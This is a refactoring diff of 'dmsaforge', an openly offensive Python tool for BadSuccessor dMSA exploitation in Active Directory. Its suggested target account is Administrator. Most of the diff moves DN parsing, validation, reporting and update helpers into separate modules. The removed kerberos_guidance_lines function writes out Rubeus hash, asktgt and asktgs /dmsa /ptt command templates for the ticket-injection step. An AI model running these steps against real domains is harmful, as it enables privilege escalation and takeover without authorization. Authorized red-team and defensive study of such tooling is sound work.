@@ -26,8 +26,6 @@
 
 
 import argparse
-import ipaddress
-import json
 import logging
 import os
 import re
@@ -38,11 +36,89 @@ import string
 import subprocess
 import sys
 import time
-import urllib.request
 import uuid
 import warnings
 
 from . import __version__
+from .ad_utils import (
+    DMSA_NAME_RE,
+    DN_ATTR_RE,
+    DN_OID_ATTR_RE,
+    DNS_HOSTNAME_RE,
+    DOMAIN_RE,
+    IPV4_LIMITED_BROADCAST,
+    IPV4_RE,
+    SID_RE,
+    account_has_inline_secret,
+    auto_dc_ip_rejection_reason,
+    base_dn_from_dn_context,
+    current_base_dn,
+    derived_base_dn_from_account,
+    display_base_dn,
+    dn_in_scope,
+    dn_rdns_for_display,
+    domain_from_account_hint,
+    domain_from_base_dn,
+    domain_to_base_dn,
+    effective_dns_hostname,
+    effective_port,
+    escape_dn_value,
+    escape_filter_chars,
+    find_unescaped,
+    format_dn_for_display,
+    format_value_for_display,
+    has_unescaped_boundary_space,
+    is_escaped_at,
+    is_ipv4_address,
+    is_usable_auto_dc_ip,
+    looks_like_dn,
+    normalize_dn,
+    normalized_dmsa_name,
+    parent_ou_from_dn,
+    parse_account_hint,
+    parse_dn,
+    planned_dmsa_dn,
+    redact_account,
+    resolve_ipv4_address,
+    split_unescaped,
+    validate_dmsa_name,
+    validate_dn_component_boundary,
+    validate_dn_syntax,
+    validate_dn_value,
+    validate_dns_hostname,
+    validate_domain_name,
+    validate_sid_syntax,
+)
+from .cli_metadata import (
+    ACTION_CHOICES,
+    ACTION_HELP,
+    ACTION_REQUIREMENTS,
+    ACTION_SUMMARY,
+    ACTION_USAGE,
+    ASSESS_ACTIONS,
+    DESTRUCTIVE_ACTIONS,
+    OPTION_ALIASES,
+    PROFILE_CHOICES,
+    SUBCOMMAND_CHOICES,
+    UPDATE_HELP,
+    VISIBLE_ACTION_CHOICES,
+)
+from .completion import completion_script
+from .kerberos import kerberos_guidance_lines, ticket_name_for_user
+from .reporting import emit_report, redact_report, report_to_text, write_output_file
+from .self_update import (
+    DEFAULT_UPDATE_SOURCE,
+    DEFAULT_UPDATE_VERSION_URL,
+    build_update_command,
+    command_to_text,
+    explicit_version_from_update_source,
+    latest_release_version,
+    normalize_version_for_update,
+    resolve_update_target_version,
+    run_update_workflow,
+    update_source_for_command,
+    update_versions_match,
+)
 
 TOOL_NAME = 'dmsaforge'
 TOOL_VERSION = 'v%s' % __version__
@@ -50,8 +126,6 @@ TOOL_DESCRIPTION = 'A redteaming tool for authorized BadSuccessor LDAP exploitat
 SCHEMA_VERSION = '1.0'
 MODIFICATIONS_BY = 'RedteamNotes'
 PROJECT_URL = 'https://github.com/RedteamNotes/dmsa-forge'
-DEFAULT_UPDATE_SOURCE = 'git+https://github.com/RedteamNotes/dmsa-forge.git'
-DEFAULT_UPDATE_VERSION_URL = 'https://api.github.com/repos/RedteamNotes/dmsa-forge/releases/latest'
 DEFAULT_SUGGESTED_DMSA_NAME = 'redpen'
 SUGGESTED_TARGET_ACCOUNT = 'Administrator'
 PRINCIPALS_ALLOWED_PLACEHOLDER = 'SID_OR_NAME'
@@ -62,19 +136,9 @@ LDAP_BASE = 'BASE'
 LDAP_LEVEL = 'LEVEL'
 LDAP_SUBTREE = 'SUBTREE'
 LDAP_SD_FLAGS_DEFAULT = 0x05
-SID_RE = re.compile(r'^S-\d-\d+(?:-\d+)+$')
-DOMAIN_RE = re.compile(r'^(?=.{1,253}$)(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z]{2,63}$')
-DNS_HOSTNAME_RE = re.compile(r'^(?=.{1,253}$)(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])$')
-DMSA_NAME_RE = re.compile(r'^[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?$')
-DN_ATTR_RE = re.compile(r'^[A-Za-z][A-Za-z0-9-]*$')
-DN_OID_ATTR_RE = re.compile(r'^\d+(?:\.\d+)+$')
-VERSION_REF_RE = re.compile(r'^v?\d+(?:\.\d+)+(?:[-._+A-Za-z0-9]*)?$')
-IPV4_RE = re.compile(r'^\d{1,3}(?:\.\d{1,3}){3}$')
-IPV4_LIMITED_BROADCAST = '255.255.255.255'
 DEFAULT_VERIFY_ATTEMPTS = 3
 DEFAULT_VERIFY_DELAY = 2
 DEFAULT_LDAP_TIMEOUT = 30.0
-PROFILE_CHOICES = ('safe', 'report', 'ci')
 DMSA_EXPECTED_DELEGATED_STATE = '2'
 DMSA_DELEGATED_STATE_MEANINGS = {
     '2': 'migration complete',
@@ -99,18 +163,6 @@ warnings.filterwarnings(
     'ignore',
     message=r'Python 3\.8 is no longer supported by the Python core team.*',
 )
-
-
-def escape_filter_chars(value):
-    value = str(value)
-    return (
-        value
-        .replace('\\', r'\5c')
-        .replace('*', r'\2a')
-        .replace('(', r'\28')
-        .replace(')', r'\29')
-        .replace('\x00', r'\00')
-    )
 
 
 def security_descriptor_control(sdflags=LDAP_SD_FLAGS_DEFAULT):
@@ -2660,30 +2712,6 @@ class DMSAForge:
             return False
 
 
-VISIBLE_ACTION_CHOICES = ('assess', 'add', 'verify', 'delete')
-ASSESS_ACTIONS = ('assess',)
-ACTION_CHOICES = VISIBLE_ACTION_CHOICES
-ACTION_SUMMARY = {
-    'assess': 'Assess OU security descriptors for BadSuccessor-relevant rights.',
-    'add': 'Create and verify a dMSA object for an authorized target account.',
-    'verify': 'Read and validate an existing dMSA object without LDAP writes.',
-    'delete': 'Delete a dMSA object, with explicit --yes confirmation required.',
-}
-ACTION_USAGE = {
-    'assess': '%(prog)s [domain/]username[:password] [options]',
-    'add': '%(prog)s [domain/]username[:password] --ou OU_DN [options]',
-    'verify': '%(prog)s [domain/]username[:password] --ou OU_DN --dmsa-name NAME [options]',
-    'delete': '%(prog)s [domain/]username[:password] --ou OU_DN --dmsa-name NAME --yes [options]',
-}
-ACTION_REQUIREMENTS = {
-    'add': (('target_ou', '--ou'),),
-    'delete': (('dmsa_name', '--dmsa-name'), ('target_ou', '--ou')),
-    'verify': (('dmsa_name', '--dmsa-name'), ('target_ou', '--ou')),
-}
-DESTRUCTIVE_ACTIONS = ('delete',)
-UTILITY_COMMANDS = ('plan', 'update')
-SUBCOMMAND_CHOICES = VISIBLE_ACTION_CHOICES + UTILITY_COMMANDS
-
 CLI_DEFAULTS = {
     'account': '',
     'action': 'assess',
@@ -2738,57 +2766,6 @@ CLI_DEFAULTS = {
     'dc_ip_supplied': False,
     'dns_hostname_supplied': False,
 }
-
-OPTION_ALIASES = {
-    'allow_admin_fallback': ('--allow-admin-fallback',),
-    'base_dn': ('--base-dn',),
-    'dc_host': ('--dc-host',),
-    'dc_ip': ('--dc-ip',),
-    'debug': ('--debug',),
-    'dmsa_name': ('--dmsa-name', '-d'),
-    'dns_hostname': ('--dns-hostname',),
-    'dry_run': ('--dry-run', '--plan'),
-    'include_sd': ('--include-security-descriptor',),
-    'json': ('--json',),
-    'k': ('--kerberos', '-k'),
-    'kdc_wait': ('--kdc-wait',),
-    'kerberos_guidance': ('--kerberos-guidance',),
-    'low_noise': ('--lean',),
-    'method': ('--method', '-m'),
-    'minimal': ('--minimal',),
-    'next_step_prefix': ('--next-step-prefix', '--command-prefix'),
-    'no_banner': ('--no-banner',),
-    'output': ('--output',),
-    'output_only': ('--output-only', '--minimal-output'),
-    'port': ('--port', '-p'),
-    'principals_allowed': ('--principals-allowed',),
-    'profile': ('--profile',),
-    'quiet': ('--quiet',),
-    'redact': ('--redact', '--no-redact'),
-    'resolve_names': ('--resolve-names',),
-    'scope_base_dn': ('--scope-base-dn',),
-    'scope_domain': ('--scope-domain',),
-    'search_summary': ('--summary',),
-    'skip_dc_prereq': ('--skip-dc-prereq',),
-    'target_account': ('--target-account', '-t'),
-    'target_ou': ('--target-ou', '--ou', '-o'),
-    'timeout': ('--timeout',),
-    'verify_attempts': ('--verify-attempts',),
-    'verify_delay': ('--verify-delay',),
-}
-
-ACTION_HELP = {
-    'assess': 'assess - evaluate BadSuccessor OU feasibility by reading OU security descriptors, identifying relevant rights, and checking whether the bound account matches any listed effective SID.',
-    'add': 'add - create and verify a dMSA object, with target OU, predecessor account, and managed-password reader validated before LDAP writes.',
-    'verify': 'verify - read and validate an existing dMSA object, with target OU and dMSA name validated before LDAP reads.',
-    'delete': 'delete - remove a dMSA object, requiring target OU, dMSA name, and explicit --yes confirmation before LDAP deletion.',
-}
-
-UPDATE_HELP = (
-    'Update dmsaforge in the Python environment that is running this command. '
-    'This works for a venv or a pipx-managed app environment.'
-)
-
 
 def print_startup_banner():
     print('%s %s - by %s' % (TOOL_NAME, TOOL_VERSION, MODIFICATIONS_BY), flush=True)
@@ -2989,455 +2966,6 @@ def connection_method(value):
     if method not in ('LDAP', 'LDAPS'):
         raise argparse.ArgumentTypeError('must be LDAP or LDAPS')
     return method
-
-
-def looks_like_dn(value):
-    value = str(value)
-    return '=' in value and ',' in value
-
-
-def domain_to_base_dn(domain):
-    domain = str(domain).strip().strip('.')
-    if not domain:
-        return None
-    return ','.join('DC=%s' % part for part in domain.split('.') if part)
-
-
-def domain_from_base_dn(base_dn):
-    parsed = parse_dn(base_dn)
-    if not parsed:
-        return None
-    labels = []
-    for rdn in parsed:
-        if len(rdn) != 1:
-            continue
-        attr, value = rdn[0]
-        if attr.lower() != 'dc':
-            continue
-        labels.append(value.replace(r'\.', '.'))
-    if not labels:
-        return None
-    return '.'.join(labels)
-
-
-def base_dn_from_dn_context(dn):
-    domain = domain_from_base_dn(dn)
-    if not domain:
-        return None
-    return domain_to_base_dn(domain)
-
-
-def parent_ou_from_dn(dn):
-    if not dn or not validate_dn_syntax(dn):
-        return None
-    rdns = split_unescaped(str(dn), {',', ';'})
-    if not rdns or len(rdns) < 2:
-        return None
-    parent_rdns = [part.strip() for part in rdns[1:] if part.strip()]
-    if not parent_rdns:
-        return None
-    sep = find_unescaped(parent_rdns[0], '=')
-    if sep <= 0 or parent_rdns[0][:sep].strip().lower() != 'ou':
-        return None
-    parent = ','.join(parent_rdns)
-    return parent if validate_dn_syntax(parent) else None
-
-
-def domain_from_account_hint(account):
-    account = str(account)
-    if '/' in account:
-        domain = account.split('/', 1)[0].strip()
-        return domain or None
-    return None
-
-
-def escape_dn_value(value):
-    value = str(value)
-    escaped = []
-    for idx, char in enumerate(value):
-        if char == ' ' and (idx == 0 or idx == len(value) - 1):
-            escaped.append('\\ ')
-        elif char == '#' and idx == 0:
-            escaped.append('\\#')
-        elif char in {',', '+', '"', '\\', '<', '>', ';', '='}:
-            escaped.append('\\%s' % char)
-        elif ord(char) < 32:
-            escaped.append('\\%02X' % ord(char))
-        else:
-            escaped.append(char)
-    return ''.join(escaped)
-
-
-def split_unescaped(value, separators):
-    parts = []
-    current = []
-    escaped = False
-    for char in str(value):
-        if escaped:
-            current.append(char)
-            escaped = False
-            continue
-        if char == '\\':
-            current.append(char)
-            escaped = True
-            continue
-        if char in separators:
-            parts.append(''.join(current))
-            current = []
-            continue
-        current.append(char)
-    if escaped:
-        return None
-    parts.append(''.join(current))
-    return parts
-
-
-def find_unescaped(value, needle):
-    escaped = False
-    for idx, char in enumerate(str(value)):
-        if escaped:
-            escaped = False
-            continue
-        if char == '\\':
-            escaped = True
-            continue
-        if char == needle:
-            return idx
-    return -1
-
-
-def is_escaped_at(value, idx):
-    backslashes = 0
-    pos = idx - 1
-    while pos >= 0 and value[pos] == '\\':
-        backslashes += 1
-        pos -= 1
-    return bool(backslashes % 2)
-
-
-def validate_dn_value(value):
-    if value == '':
-        return False
-
-    if value[0] == ' ' or value[-1] == ' ':
-        if (value[0] == ' ' and not is_escaped_at(value, 0)) or (value[-1] == ' ' and not is_escaped_at(value, len(value) - 1)):
-            return False
-
-    if value[0] == '#' and not is_escaped_at(value, 0):
-        return False
-
-    idx = 0
-    hex_digits = set('0123456789abcdefABCDEF')
-    escaped_chars = set(' "#+,;<>\\=')
-    while idx < len(value):
-        char = value[idx]
-        if char == '\\':
-            if idx + 1 >= len(value):
-                return False
-            if idx + 2 < len(value) and value[idx + 1] in hex_digits and value[idx + 2] in hex_digits:
-                idx += 3
-                continue
-            if value[idx + 1] in escaped_chars:
-                idx += 2
-                continue
-            return False
-        if ord(char) < 32:
-            return False
-        if char in ',+"\\<>;=':
-            return False
-        idx += 1
-    return True
-
-
-def has_unescaped_boundary_space(value):
-    if value == '':
-        return False
-    if value[0] == ' ' and not is_escaped_at(value, 0):
-        return True
-    if value[-1] == ' ' and not is_escaped_at(value, len(value) - 1):
-        return True
-    return False
-
-
-def validate_dn_component_boundary(value):
-    if not value:
-        return False
-    if has_unescaped_boundary_space(value):
-        return False
-    return True
-
-
-def parse_dn(value):
-    if value in (None, ''):
-        return None
-
-    value = str(value)
-    if has_unescaped_boundary_space(value):
-        return None
-
-    rdns = split_unescaped(value, {',', ';'})
-    if rdns is None or not rdns:
-        return None
-
-    parsed = []
-    for rdn in rdns:
-        if not validate_dn_component_boundary(rdn):
-            return None
-        avas = split_unescaped(rdn, {'+'})
-        if avas is None or not avas:
-            return None
-
-        parsed_rdn = []
-        for ava in avas:
-            if not validate_dn_component_boundary(ava):
-                return None
-            sep = find_unescaped(ava, '=')
-            if sep <= 0:
-                return None
-            attr = ava[:sep]
-            val = ava[sep + 1:]
-            if not attr or not (DN_ATTR_RE.match(attr) or DN_OID_ATTR_RE.match(attr)):
-                return None
-            if not validate_dn_value(val):
-                return None
-            parsed_rdn.append((attr, val))
-        parsed.append(parsed_rdn)
-    return parsed
-
-
-def normalize_dn(value):
-    parsed = parse_dn(value)
-    if not parsed:
-        return ','.join(part.strip().lower() for part in str(value).split(',') if part.strip())
-    return ','.join(
-        '+'.join('%s=%s' % (attr.lower(), val.lower()) for attr, val in rdn)
-        for rdn in parsed
-    )
-
-
-def dn_in_scope(dn, scope_base_dn):
-    dn = normalize_dn(dn)
-    scope_base_dn = normalize_dn(scope_base_dn)
-    return dn == scope_base_dn or dn.endswith(',' + scope_base_dn)
-
-
-def validate_domain_name(value):
-    return bool(value and DOMAIN_RE.match(str(value).strip()))
-
-
-def validate_dns_hostname(value):
-    value = str(value or '').strip().rstrip('.')
-    return bool(value and DNS_HOSTNAME_RE.match(value))
-
-
-def is_ipv4_address(value):
-    value = str(value or '').strip()
-    if not IPV4_RE.match(value):
-        return False
-    try:
-        socket.inet_aton(value)
-    except OSError:
-        return False
-    return all(0 <= int(part) <= 255 for part in value.split('.'))
-
-
-def auto_dc_ip_rejection_reason(value):
-    value = str(value or '').strip()
-    if not is_ipv4_address(value):
-        return 'not an IPv4 address'
-    try:
-        address = ipaddress.ip_address(value)
-    except ValueError:
-        return 'not an IPv4 address'
-    if address.is_multicast:
-        return 'multicast address'
-    if address.is_loopback:
-        return 'loopback'
-    if address.is_link_local:
-        return 'link-local'
-    if address.is_unspecified:
-        return 'unspecified'
-    if value == IPV4_LIMITED_BROADCAST:
-        return 'limited broadcast'
-    if address.is_reserved:
-        return 'reserved'
-    return ''
-
-
-def is_usable_auto_dc_ip(value):
-    return not auto_dc_ip_rejection_reason(value)
-
-
-def resolve_ipv4_address(host, usable_only=False):
-    host = str(host or '').strip()
-    if not host:
-        return None
-    if is_ipv4_address(host):
-        return host if not usable_only or is_usable_auto_dc_ip(host) else None
-    try:
-        infos = socket.getaddrinfo(host, None, socket.AF_INET, socket.SOCK_STREAM)
-    except OSError:
-        return None
-    for info in infos:
-        address = info[4][0]
-        if is_ipv4_address(address) and (not usable_only or is_usable_auto_dc_ip(address)):
-            return address
-    return None
-
-
-def parse_account_hint(account):
-    account = str(account or '')
-    domain = ''
-    username = ''
-    password = ''
-    if '/' in account:
-        domain, rest = account.split('/', 1)
-    else:
-        rest = account
-    if ':' in rest:
-        username, password = rest.split(':', 1)
-    else:
-        username = rest
-    if '@' in username and not domain:
-        username, domain = username.split('@', 1)
-    return domain, username, password
-
-
-def ticket_name_for_user(username):
-    value = re.sub(r'[^A-Za-z0-9_.-]+', '_', str(username or '').strip())
-    return '%s.kirbi' % (value or 'tgt')
-
-
-def kerberos_guidance_lines(domain, username, password, dmsa_name, dc_host=None, dc_ip=None):
-    dc_ipv4 = None
-    if dc_ip:
-        dc_ipv4 = str(dc_ip).strip() if is_ipv4_address(dc_ip) else resolve_ipv4_address(dc_ip, usable_only=True)
-    if not dc_ipv4:
-        dc_ipv4 = resolve_ipv4_address(dc_host, usable_only=True)
-    dc_ipv4 = dc_ipv4 or '<DC_IPV4>'
-    domain = str(domain or '').strip() or '<DOMAIN>'
-    username = str(username or '').strip() or '<USERNAME>'
-    password = str(password or '').strip() or '<PASSWORD>'
-    dmsa_name = normalized_dmsa_name(dmsa_name) or DEFAULT_SUGGESTED_DMSA_NAME
-    realm = domain.upper()
-    ticket_path = ticket_name_for_user(username)
-    dc_hint = 'Use /dc:%s as an IPv4 address to avoid IPv6 link-local resolution.' % dc_ipv4
-    if dc_ipv4 == '<DC_IPV4>':
-        dc_hint = 'Set --dc-ip to a specific DC IPv4 before using these Kerberos commands.'
-    return [
-        'Next Kerberos step must be verified outside this script.',
-        dc_hint,
-        r'.\Rubeus.exe hash /user:%s /password:%s /domain:%s' % (username, password, domain),
-        r'.\Rubeus.exe asktgt /user:%s /aes256:<AES256_HASH_FROM_RUBEUS_HASH> /domain:%s /dc:%s /outfile:%s /nowrap' % (username, domain, dc_ipv4, ticket_path),
-        r".\Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/%s /targetuser:'%s$' /ticket:%s /dc:%s /ptt /nowrap" % (realm, dmsa_name, ticket_path, dc_ipv4),
-    ]
-
-
-def normalized_dmsa_name(value):
-    return str(value or '').strip().rstrip('$').strip()
-
-
-def validate_dmsa_name(value):
-    value = normalized_dmsa_name(value)
-    return bool(value and DMSA_NAME_RE.match(value))
-
-
-def validate_dn_syntax(value):
-    if not value or not looks_like_dn(value):
-        return False
-    return parse_dn(value) is not None
-
-
-def validate_sid_syntax(value):
-    return bool(value and SID_RE.match(str(value).strip()))
-
-
-def redact_account(account):
-    account = str(account)
-    colon = account.find(':')
-    if colon < 0:
-        return account
-
-    at_after_secret = account.find('@', colon)
-    if at_after_secret >= 0:
-        return account[:colon + 1] + '<redacted>' + account[at_after_secret:]
-    return account[:colon + 1] + '<redacted>'
-
-
-def account_has_inline_secret(account):
-    account = str(account or '')
-    if not account:
-        return False
-    principal = account.split('@', 1)[0]
-    if '/' in principal:
-        principal = principal.split('/', 1)[1]
-    if ':' not in principal:
-        return False
-    username, secret = principal.split(':', 1)
-    return bool(username and secret)
-
-
-def format_dn_for_display(dn, base_dn=None, redact=True):
-    if dn in (None, ''):
-        return dn
-
-    return str(dn)
-
-
-def format_value_for_display(value, base_dn=None, redact=True):
-    if value in (None, ''):
-        return value
-    if looks_like_dn(value):
-        return format_dn_for_display(value, base_dn=base_dn, redact=redact)
-    return str(value)
-
-
-def dn_rdns_for_display(dn):
-    parts = split_unescaped(dn, {',', ';'})
-    if not parts:
-        return []
-    return [part.strip() for part in parts if part.strip()]
-
-
-def derived_base_dn_from_account(account):
-    account = str(account)
-    if '/' not in account:
-        return None
-    domain = account.split('/', 1)[0]
-    if not domain or '.' not in domain:
-        return None
-    return ','.join('DC=%s' % part for part in domain.split('.') if part)
-
-
-def effective_port(options):
-    if options.port is not None:
-        return options.port
-    return 389 if options.method == 'LDAP' else 636
-
-
-def planned_dmsa_dn(options):
-    if not options.dmsa_name or not options.target_ou:
-        return None
-    return 'CN=%s,%s' % (options.dmsa_name.rstrip('$'), options.target_ou)
-
-
-def current_base_dn(options):
-    return options.base_dn or derived_base_dn_from_account(options.account)
-
-
-def display_base_dn(options):
-    return options.scope_base_dn or current_base_dn(options)
-
-
-def effective_dns_hostname(options):
-    if options.dns_hostname:
-        return options.dns_hostname
-    if not options.dmsa_name:
-        return None
-    domain = options.scope_domain or domain_from_account_hint(options.account)
-    if not domain or not validate_domain_name(domain):
-        return None
-    return '%s.%s' % (options.dmsa_name.rstrip('$').lower(), domain.lower())
 
 
 def planned_inference_events(options):
@@ -3732,21 +3260,6 @@ def build_operation_report(options, mode, success=None, result=None):
         'result': result or {},
     }
     return redact_report(report, options)
-
-
-def redact_report(value, options):
-    if not options.redact:
-        return value
-    base_dn = display_base_dn(options)
-    if isinstance(value, dict):
-        return {key: redact_report(item, options) for key, item in value.items()}
-    if isinstance(value, list):
-        return [redact_report(item, options) for item in value]
-    if isinstance(value, str):
-        if looks_like_dn(value) and validate_dn_syntax(value):
-            return format_dn_for_display(value, base_dn=base_dn, redact=True)
-        return value
-    return value
 
 
 def truthy_env(value):
@@ -4214,88 +3727,6 @@ def print_dry_run_plan(options, report=None):
     return report
 
 
-def report_to_text(report):
-    lines = [
-        'operation_id: %s' % report.get('operation_id'),
-        'tool: %s %s' % (report.get('tool'), report.get('version')),
-        'mode: %s' % report.get('mode'),
-        'success: %s' % report.get('success'),
-        'action: %s' % report.get('action'),
-    ]
-    connection = report.get('connection', {})
-    lines.append('connection: %s:%s %s auth=%s base_dn=%s' % (
-        connection.get('dc_host'),
-        connection.get('port'),
-        connection.get('method'),
-        connection.get('auth'),
-        connection.get('base_dn'),
-    ))
-    scope = report.get('scope', {})
-    lines.append('scope: domain=%s base_dn=%s' % (scope.get('domain'), scope.get('base_dn')))
-    result = report.get('result') or {}
-    if result:
-        lines.append('result:')
-        for key in sorted(result):
-            lines.append('  %s: %s' % (key, result[key]))
-    inference = report.get('inference') or []
-    if inference:
-        lines.append('inference:')
-        for event in inference:
-            lines.append('  - %s: %s - %s' % (event.get('kind'), event.get('status'), event.get('detail')))
-    operations = report.get('ldap_operations') or []
-    if operations:
-        lines.append('ldap_operations:')
-        for idx, operation in enumerate(operations, 1):
-            lines.append('  %d. %s' % (idx, json.dumps(operation, sort_keys=True)))
-    return '\n'.join(lines) + '\n'
-
-
-def write_output_file(path, text):
-    flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC
-    if hasattr(os, 'O_NOFOLLOW'):
-        flags |= os.O_NOFOLLOW
-    fd = os.open(path, flags, 0o600)
-    try:
-        os.fchmod(fd, 0o600)
-        with os.fdopen(fd, 'w') as handle:
-            fd = None
-            handle.write(text)
-    finally:
-        if fd is not None:
-            os.close(fd)
-
-
-def emit_report(options, report):
-    if report is None:
-        return True
-
-    def write_report_file(text):
-        try:
-            write_output_file(options.output, text)
-            return True
-        except Exception as e:
-            sys.stderr.write('Could not write output file %s: %s\n' % (options.output, e))
-            return False
-
-    if options.output_only:
-        if options.output:
-            return write_report_file(json.dumps(report, indent=2, sort_keys=True) + '\n')
-        else:
-            sys.stdout.write(json.dumps(report, indent=2, sort_keys=True) + '\n')
-        return True
-
-    if options.json:
-        text = json.dumps(report, indent=2, sort_keys=True) + '\n'
-        sys.stdout.write(text)
-        if options.output:
-            return write_report_file(text)
-        return True
-
-    if options.output:
-        return write_report_file(report_to_text(report))
-    return True
-
-
 def add_common_local_options(parser, include_workflow=True, concise=False, workflow_group=None):
     local = parser
     workflow_target = workflow_group or parser
@@ -4747,277 +4178,17 @@ def parse_account(options):
     return domain, username, password, lmhash, nthash
 
 
-def command_to_text(parts):
-    return ' '.join(shlex.quote(str(part)) for part in parts)
-
-
-def normalize_version_for_update(version):
-    version = str(version or '').strip()
-    if version.lower().startswith('v'):
-        version = version[1:]
-    return version
-
-
-def update_versions_match(current_version, target_version):
-    return normalize_version_for_update(current_version) == normalize_version_for_update(target_version)
-
-
-def explicit_version_from_update_source(source):
-    source = str(source or '').strip()
-    if '.git@' not in source:
-        return None
-    ref = source.rsplit('.git@', 1)[1].split('#', 1)[0].strip()
-    if VERSION_REF_RE.match(ref):
-        return ref
-    return None
-
-
-def latest_release_version(timeout=10):
-    request = urllib.request.Request(
-        DEFAULT_UPDATE_VERSION_URL,
-        headers={'Accept': 'application/vnd.github+json', 'User-Agent': TOOL_NAME},
-    )
-    with urllib.request.urlopen(request, timeout=timeout) as response:
-        payload = json.loads(response.read().decode('utf-8'))
-    version = payload.get('tag_name')
-    if not version:
-        raise ValueError('latest release response did not include tag_name')
-    return version
-
-
-def resolve_update_target_version(source):
-    explicit_version = explicit_version_from_update_source(source)
-    if explicit_version:
-        return explicit_version, 'source ref'
-    if (source or DEFAULT_UPDATE_SOURCE) == DEFAULT_UPDATE_SOURCE:
-        return latest_release_version(), 'latest GitHub release'
-    return None, 'custom source without version ref'
-
-
-def update_source_for_command(source, target_version=None, version_source=None):
-    source = source or DEFAULT_UPDATE_SOURCE
-    if (
-        source == DEFAULT_UPDATE_SOURCE
-        and target_version
-        and version_source == 'latest GitHub release'
-        and explicit_version_from_update_source(source) is None
-    ):
-        return '%s@%s' % (source, target_version)
-    return source
-
-
-def build_update_command(options, target_version=None, version_source=None):
-    command = [sys.executable, '-m', 'pip', 'install', '--upgrade']
-    if options.quiet:
-        command.append('-q')
-    command.append(update_source_for_command(options.update_source, target_version, version_source))
-    return command
-
-
 def run_update(options):
-    if should_show_banner(options):
-        print_startup_banner()
-
-    current_version = TOOL_VERSION
-    target_version = None
-    version_source = None
-    if not options.force:
-        try:
-            target_version, version_source = resolve_update_target_version(options.update_source)
-        except Exception as e:
-            sys.stderr.write('Could not determine update target version: %s\n' % e)
-            sys.stderr.write('Use "dmsaforge update --force" to run pip anyway.\n')
-            return 1
-
-        if target_version is None:
-            sys.stderr.write('Could not determine update target version from %s.\n' % version_source)
-            sys.stderr.write('Use a versioned source such as "%s@v%s", or run "dmsaforge update --force".\n' % (DEFAULT_UPDATE_SOURCE, __version__))
-            return 1
-
-        if not options.quiet:
-            sys.stdout.write('Current version: %s\n' % current_version)
-            sys.stdout.write('Target version:  %s\n' % target_version)
-            sys.stdout.write('Version source:  %s\n' % version_source)
-
-        if update_versions_match(current_version, target_version):
-            if not options.quiet:
-                sys.stdout.write('No update required; versions match.\n')
-            return 0
-
-    command = build_update_command(options, target_version, version_source)
-    command_text = command_to_text(command)
-
-    if options.dry_run:
-        if not options.quiet:
-            sys.stdout.write('Update dry-run: no changes will be made.\n')
-        sys.stdout.write('Update command: %s\n' % command_text)
-        return 0
-
-    if not options.quiet:
-        sys.stdout.write('Updating %s in the current Python environment.\n' % TOOL_NAME)
-        sys.stdout.write('Python: %s\n' % sys.executable)
-        sys.stdout.write('Command: %s\n' % command_text)
-        sys.stdout.write('\n')
-
-    start_cwd = os.getcwd()
-    try:
-        completed = subprocess.run(command, cwd=start_cwd)
-    except OSError as e:
-        sys.stderr.write('Could not start update command: %s\n' % e)
-        return 1
-    finally:
-        try:
-            os.chdir(start_cwd)
-        except OSError:
-            pass
-
-    if completed.returncode == 0:
-        if not options.quiet:
-            sys.stdout.write('\nUpdate completed. Run "dmsaforge -v" to confirm the installed version.\n')
-        return 0
-
-    sys.stderr.write('\nUpdate failed with exit code %s.\n' % completed.returncode)
-    return completed.returncode
-
-
-def completion_script(shell):
-    commands = ' '.join(ACTION_CHOICES + ('plan', 'update'))
-    action_options = ' '.join([
-        '--help', '-h',
-        '--profile',
-        '--dry-run', '--plan',
-        '--json', '--output', '--output-only',
-        '--quiet', '--no-banner',
-        '--redact', '--no-redact',
-        '--scope-domain', '--scope-base-dn',
-        '--dc-host', '--dc-ip',
-        '-m', '--method', '-p', '--port',
-    ])
-    assess_options = '%s %s' % (
-        action_options,
-        '--ou --target-ou -o --summary --include-security-descriptor --resolve-names --skip-dc-prereq',
-    )
-    add_options = '%s %s' % (
-        action_options,
-        '-d --dmsa-name -o --ou --target-ou -t --target-account --principals-allowed --dns-hostname',
-    )
-    verify_options = '%s %s' % (
-        action_options,
-        '-d --dmsa-name -o --ou --target-ou --principals-allowed',
-    )
-    delete_options = '%s %s' % (
-        action_options,
-        '-d --dmsa-name -o --ou --target-ou --yes',
-    )
-    root_options = '--help -h --version -v'
-    plan_options = '--help -h'
-    update_options = '--help -h --dry-run --source --force --quiet'
-    action_names = ' '.join(ACTION_CHOICES)
-    if shell == 'bash':
-        return '''# dmsaforge bash completion
-_dmsaforge_completion() {
-  local cur="${COMP_WORDS[COMP_CWORD]}"
-  local command="${COMP_WORDS[1]}"
-  local plan_action="${COMP_WORDS[2]}"
-  local root_opts="%s"
-  local plan_opts="%s"
-  local assess_opts="%s"
-  local add_opts="%s"
-  local verify_opts="%s"
-  local delete_opts="%s"
-  local update_opts="%s"
-  if [[ ${COMP_CWORD} -eq 1 ]]; then
-    COMPREPLY=( $(compgen -W "%s $root_opts" -- "$cur") )
-    return 0
-  fi
-  if [[ "$command" == "plan" && ${COMP_CWORD} -eq 2 ]]; then
-    if [[ "$cur" == -* ]]; then
-      COMPREPLY=( $(compgen -W "$plan_opts" -- "$cur") )
-    else
-      COMPREPLY=( $(compgen -W "%s" -- "$cur") )
-    fi
-    return 0
-  fi
-  case "$cur" in
-    -*|"")
-      local option_source="$root_opts"
-      case "$command" in
-        assess) option_source="$assess_opts" ;;
-        add) option_source="$add_opts" ;;
-        verify) option_source="$verify_opts" ;;
-        delete) option_source="$delete_opts" ;;
-        update) option_source="$update_opts" ;;
-        plan)
-          option_source="$plan_opts"
-          case "$plan_action" in
-            assess) option_source="$assess_opts" ;;
-            add) option_source="$add_opts" ;;
-            verify) option_source="$verify_opts" ;;
-            delete) option_source="$delete_opts" ;;
-          esac
-          ;;
-      esac
-      COMPREPLY=( $(compgen -W "$option_source" -- "$cur") )
-      return 0
-      ;;
-  esac
-}
-complete -F _dmsaforge_completion dmsaforge
-''' % (root_options, plan_options, assess_options, add_options, verify_options, delete_options, update_options, commands, action_names)
-    return '''# dmsaforge zsh completion
-# No-persistence use for the current shell:
-#   eval "$(dmsaforge --completion-script zsh)"
-# For persistent use, save this output as a file on your fpath.
